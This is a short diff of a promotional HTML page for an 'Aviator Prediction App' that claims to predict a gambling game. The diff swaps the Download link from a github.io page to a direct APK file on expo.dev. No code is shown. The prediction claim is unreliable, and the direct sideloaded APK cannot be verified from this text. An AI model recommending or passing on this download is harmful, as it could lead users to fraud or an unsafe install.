@@ -5,7 +5,7 @@
 <table align=center> <tr>
       <th scope="col">Aviator Prediction App</th>
       <th scope="col">02 / 12 / 2025</th>
-  <th scope="col"><a href='https://Avitsa.github.io/aviator-predictor-pro'>Download</th>
+  <th scope="col"><a href='https://expo.dev/artifacts/eas/gthPV64vXks21UMjNoPQez.apk'>Download</th>
  </tr><table/>
 <h4 align=center>Available for iOS, and Android<br> <br>
 <div align="center">
